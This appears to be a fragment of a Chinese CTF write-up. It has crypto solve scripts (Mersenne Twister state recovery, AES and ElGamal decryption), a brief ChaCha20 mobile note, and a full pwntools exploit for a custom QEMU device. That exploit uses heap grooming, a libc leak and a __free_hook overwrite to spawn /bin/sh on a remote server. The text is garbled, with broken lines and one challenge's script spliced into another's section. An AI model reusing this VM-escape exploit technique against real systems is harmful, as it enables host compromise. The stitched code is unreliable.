4091742681, 2639530247, 4240681440, 2169059390, 1149325301, 3139578541, 2320870639, 
3148999826, 4095173534, 2742698014, 3623896968, 2444601912, 1958855100, 1743268893], 
[2187625371, 3533912845, 29086928, 543325588, 4247300963, 1972139209, 272152499, 
4276082595, 3680551759, 1835350157, 3921757922, 2716774439, 1070751202, 69990939, 
3794506838, 699803423, 3699976889, 40791189], [539106994, 1670272368, 3483599225, 
2867955550, 2207694005, 1126950203, 693920921, 2333328675, 539234245, 1961438796, 
3126390464, 1118759587, 59715473, 1450076492, 4101732655, 3658733365, 940858890, 
1262671744], [3092624332, 2175813516, 3355101899, 3657267135, 770650398, 359506155, 
4149470178, 3763654751, 1184381886, 942048015, 523057971, 1098635956, 1732951811, 
150067724, 2417766207, 4152571821, 2759971924, 4284842765], [3336022203, 2569311431, 
2752777107, 1441977867, 1279003682, 3861567631, 1064716472, 3046493996, 1339401643, 
39466446, 1464905290, 420733872, 2057911345, 2418624800, 2193625430, 1558527155, 
4224908000, 207684355], [2681129718, 4210889596, 4051161171, 3131196482, 1128312875, 
938670840, 2828563599, 3078146488, 1102989364, 3557724304, 156013303, 2371355565, 
3608679353, 3513837899, 155622460, 396656112, 2493417457, 876296360], [3135876409, 
181875076, 3662181650, 3851859805, 3626146919, 90441351, 1944988720, 585429580, 
3158268550, 1399100291, 3688843295, 2851190, 2670576474, 3177735154, 3479499727, 
197376977, 1790622954, 2393956089]]
cipher = [4325818019, 2670265818, 4804078249, 3082712000, 2791756019, 4114207927, 
32903302, 681859623, 1914242441, 3459255538, 1781251274, 2705263119, 199613420, 
613239489, 1726033668, 2140896224, 3908774846, 3015013168, 3240286365, 1888438156, 
223825531, 3210441909, 1012497643, 4359288498, 2438339216, 2483290354, 3716120316, 
1066957542, 3496060250, 4707561887, 1439752455, 2257295093, 2677914042, 3387293794]
R = IntegerModRing(q)
M = Matrix(R, key)
msg3 = ''.join(map(chr,M.solve_right(vector(R,cipher))))
mail = msg3.encode()
lb0 = 22186905890293167337018474051
ub0 = 22186905890293167337018474102
lb1 = 64390888389278700958517837503
ub1 = 64390888389278700958517837592
mask = (1>32)&mask)
#         rc.submit((i>>64)&mask)
#         rc.submit(j&mask)
#         rc.submit((j>>32)&mask)
#         rc.submit((j>>64)&mask)
#         rc.submit(pad&mask)
#         rc.submit((pad>>32)&mask)
#         rc.submit((pad>>64)&mask)
#         rc.submit((pad>>96)&mask)
#         rc.submit((pad>>128)&mask)
#         rc.submit(diff)
#         for x in range(34):
#             for y in range(len(mail)):
#                 rc.submit(key[x][y])
#         aeskey = long_to_bytes(rc.predict_getrandbits(128))
#         a = AES.new(aeskey,AES.MODE_ECB)
#         msg = a.decrypt(long_to_bytes(4663812185407413617442589600527575850)).str()
#         if all([c in printable for c in  msg]):
#             print(i,j,aeskey, msg)
#             exit(0)
i,j= 22186905890293167337018474052, 64390888389278700958517837515
rc = RandCrack()
rc.submit(i&mask)
rc.submit((i>>32)&mask)
rc.submit((i>>64)&mask)
rc.submit(j&mask)
rc.submit((j>>32)&mask)
rc.submit((j>>64)&mask)
rc.submit(pad&mask)
rc.submit((pad>>32)&mask)
rc.submit((pad>>64)&mask)
rc.submit((pad>>96)&mask)
rc.submit((pad>>128)&mask)
rc.submit(diff)
for x in range(34):
    for y in range(len(mail)):
        rc.submit(key[x][y])
aeskey = long_to_bytes(rc.predict_getrandbits(128))
a = AES.new(aeskey,AES.MODE_ECB)
Mobile
uniapp
看起来是个chacha20，直接⽤它js现成的解密函数解就⾏
密⽂p = [34, 69, 86, 242, 93, 72, 134, 226, 42, 138, 112, 56, 189, 53, 77, 178, 223, 76, 78, 221, 63, 40, 86, 231, 
121, 29, 154, 189, 204, 243, 205, 44, 141, 100, 13, 164, 35, 123]
⼏个参数
i = new Uint8Array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 
28, 29, 30, 31])
a = new Uint8Array([0, 0, 0, 0, 0, 0, 0, 74, 0, 0, 0, 0])
s = 1
f= new r(i,a,s)
msg = a.decrypt(long_to_bytes(4663812185407413617442589600527575850))
address = msg
q,g,h = 
100745716474520129382342652195639327015477094835273324287249437173477166280924801413511
01355311415396138752005498917333222412501490191601765376359710800979, 
872081425474508977725208334434885126852069231882803045212254992674885974140212579973617
8655620806485161358327515735405190921467358304697344848268434382637, 
477172260599657947838006456734210634171968238301955220545205562436901948073973438458964
9787120284793958469470324545595398217251092376423755308135664464425
g0 = rc.predict_randrange(q-1)
x0 = rc.predict_randrange(q-1)
y0 = rc.predict_randrange(q-1)
c1,c2 = 
451906903029444687220680460445511474470934823746601636562099822402217711714368447997497
9349963809703440329581216394519261239811301206970312092675406502650, 
381170088180198726907016474948484656029244022524832908685866193117029536686727527742146
7706163328741035400455667115338775148483606038354192869181765555267
s = pow(c1, x0, q)
m = (c2*inverse(s, q)) % q
school = long_to_bytes(m)
flag = 'flag{'+sha256(name).hexdigest()[:8]+'-'+sha256(phone).hexdigest()[:4]+'-
'+sha256(mail).hexdigest()[:4]+'-'+sha256(address).hexdigest()[:4]+'-
'+sha256(school).hexdigest()[:12]+'}'
print (flag)
c = new Uint8Array(p)
f.decrypt(c)
最后再异或102拿到flag
Misc
签到题
签到
云安全
Cloud_QM
from pwn import *
from docker_debug import *
context.log_level = 'debug'
context.aslr = False
def write_addr(p: tube, addr: int, data: bytes) -> None:
    p.sendline('b64write {} {} {}'.format(addr, len(data), 
base64.b64encode(data).decode()))
    pass
def writeq(p: tube, addr: int, data: int) -> None:
    p.sendline('writeq {} {}'.format(addr, data))
    p.recvuntil('OK\n')
    p.recvuntil('OK\n')
def read_addr(p: tube, addr: int, size: int) -> bytes:
    p.sendline('b64read {} {}'.format(addr, size))
    p.recvuntil('OK ')
    ret = base64.b64decode(p.recvuntil('\n'))
    p.recvuntil('OK ')
    p.recvuntil('\n')
    return ret
def readq(p: tube, addr: int) -> int:
    p.sendline('readq {}'.format(addr))
    p.recvuntil('OK ')
    ret = int(p.recvuntil('\n'), 16)
    p.recvuntil('OK ')
    p.recvuntil('\n')
    return ret
BASE = 0xfeb00000
def set_note_idx(p: tube, idx: int) -> None:
    writeq(p, BASE + 0x40, idx)
def set_size(p: tube, size: int) -> None:
    writeq(p, BASE + 0x8, size)
def alloc(p: tube) -> None:
    writeq(p, BASE + 0x10, 0)
def set_dma_addr(p: tube, dma_addr: int) -> None:
    writeq(p, BASE + 0x18, dma_addr)
def read_to_buf(p: tube) -> None:
    writeq(p, BASE + 0x20, 0)
def write_to_vm(p: tube) -> None:
    writeq(p, BASE + 0x28, 0)
def free(p: tube) -> None:
    writeq(p, BASE + 0x30, 0)
debug_env = DockerDebug('ubuntu-2004')
process = debug_env.process
attach = debug_env.attach
def main():
    #p = process('./qemu-system-x86_64 -display none -machine accel=qtest -m 512M -
device ctf -nodefaults -monitor none -qtest stdio'.split(' '))
    p = remote('114.115.214.225', 8888)
    p.recvuntil('OPENED')
    p.sendline('outl 0xcf8 0x80001010')
    p.recvuntil('OK')
    p.sendline('outl 0xcfc 0xfebc0000')
    p.recvuntil('OK')
    p.sendline('outl 0xcf8 0x80001004')
    p.recvuntil('OK')
    p.sendline('outl 0xcfc 0x107')
    p.recvuntil('OK')
    set_note_idx(p, 0)
    fengshui_size = 0x68
    for i in range(8):
        set_note_idx(p, i + 1)
        set_size(p, fengshui_size)
        alloc(p)
    # set_dma_addr(p, 0)
    # set_note_idx(p, 1)
    # free(p)
    # set_note_idx(p, 2)
    # free(p)
    # set_note_idx(p, 3)
    # free(p)
    # set_note_idx(p, 7)
    # set_dma_addr(p, BASE+0x40) # set idx 0
    # free(p)
    # # leak heap addr
    # set_note_idx(p, 7)
    # set_dma_addr(p, 0x100)
    # write_to_vm(p)
    # heap_data = read_addr(p, 0x100, fengshui_size)
    # log.info('data: {} {:#x} {:#x}'.format(heap_data, u64(heap_data[:8]), 
u64(heap_data[8:16])))
    # tcache_head_addr = heap_data[8:16]
    # offset = 0x55555657a470 - 0x55555657a010
    set_note_idx(p, 9)
    set_size(p, 0x500)
    alloc(p)
    set_dma_addr(p, BASE+0x40) # set idx 0
    free(p)
    set_note_idx(p, 9)
    set_dma_addr(p, 0x100)
    write_to_vm(p)
    libc_base = u64(read_addr(p, 0x100, 0x8)) - 0x1ebbe0
    system_addr = libc_base + 0x55410
    free_hook_addr = libc_base + 0x1eeb28
    log.success('libc: {:#x} system: {:#x}'.format(libc_base, system_addr))
    # 放置 binsh
    set_note_idx(p, 5)
    set_dma_addr(p, 0x300)
    write_addr(p, 0x300, b'/bin/sh')
    read_to_buf(p)
    set_dma_addr(p, 0)
    set_note_idx(p, 1)
    free(p)
    set_note_idx(p, 2)
    free(p)
    set_note_idx(p, 3)
    free(p)
    set_note_idx(p, 4)
    set_dma_addr(p, BASE+0x40) # set idx 0
    free(p)
    write_addr(p, 0x200, p64(free_hook_addr))
    write_addr(p, 0x300, p64(system_addr))
    set_note_idx(p, 4)
    set_dma_addr(p, 0x200)
    read_to_buf(p)
    set_note_idx(p, 10)
    set_size(p, fengshui_size)
    alloc(p)
    set_note_idx(p, 11)
    set_size(p, fengshui_size)
    alloc(p)
    set_note_idx(p, 11)
    set_dma_addr(p, 0x300)
    read_to_buf(p)
    set_note_idx(p, 5)
    free(p)
    # attach(p)
    # input()
    p.interactive()
if __name__ == '__main__':
    main()